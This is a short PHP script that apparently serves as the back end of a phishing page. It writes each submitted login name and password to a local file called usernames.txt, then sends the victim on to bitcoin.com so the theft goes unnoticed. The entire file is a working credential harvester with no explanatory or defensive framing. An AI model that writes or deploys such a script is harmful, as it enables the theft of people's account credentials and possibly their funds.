<?php

file_put_contents("usernames.txt", "Account: " . $_POST['login'] . "\nPass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.bitcoin.com');
exit();
